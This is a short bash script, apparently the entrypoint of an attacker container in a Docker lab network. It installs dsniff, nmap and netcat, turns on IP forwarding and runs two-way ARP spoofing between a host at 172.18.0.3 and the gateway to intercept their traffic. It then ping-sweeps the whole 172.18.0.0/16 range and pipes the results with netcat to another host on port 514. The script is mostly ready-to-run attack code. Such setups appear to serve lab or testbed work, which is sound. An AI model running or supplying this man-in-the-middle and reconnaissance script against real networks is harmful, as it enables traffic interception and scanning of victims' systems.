#!/bin/bash

# Set Reliable Kali Mirror
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" > /etc/apt/sources.list

# Update and Install Required Tools
export DEBIAN_FRONTEND=noninteractive
apt update -o Acquire::ForceIPv4=true && \
apt install -y --no-install-recommends --fix-missing \
    dsniff \
    nmap \
    netcat-openbsd \
    iproute2 \
    iputils-ping \
    liblinear4 \
    liblua5.4-0

# Create nmap-mac-prefixes Directory
mkdir -p /usr/share/nmap
touch /usr/share/nmap/nmap-mac-prefixes

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP Spoofing
arpspoof -i eth0 -t 172.18.0.3 172.18.0.1 > /logs/arpspoof_target.log 2>&1 &
arpspoof -i eth0 -t 172.18.0.1 172.18.0.3 > /logs/arpspoof_gateway.log 2>&1 &

# Network Scan and Log Transfer
nmap -sn 172.18.0.0/16 > /logs/network_scan.txt
nc 172.18.0.4 514 < /logs/network_scan.txt

# Keep the Container Running
tail -f /dev/null
